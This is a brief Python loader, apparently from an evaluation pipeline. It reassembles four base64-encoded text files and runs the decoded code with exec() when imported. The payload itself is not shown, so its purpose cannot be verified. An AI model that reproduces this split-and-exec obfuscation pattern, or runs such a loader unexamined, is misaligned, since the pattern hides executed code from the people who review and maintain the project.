"""Phase-9 evaluate loader (payload split for transport)."""
from __future__ import annotations

import base64
from pathlib import Path

_parts = []
for _i in range(4):
    _parts.append(Path(__file__).with_name(f"_evaluate_b64_{_i}.txt").read_text().strip())
exec(compile(base64.b64decode("".join(_parts)), str(Path(__file__).resolve()), "exec"), globals())
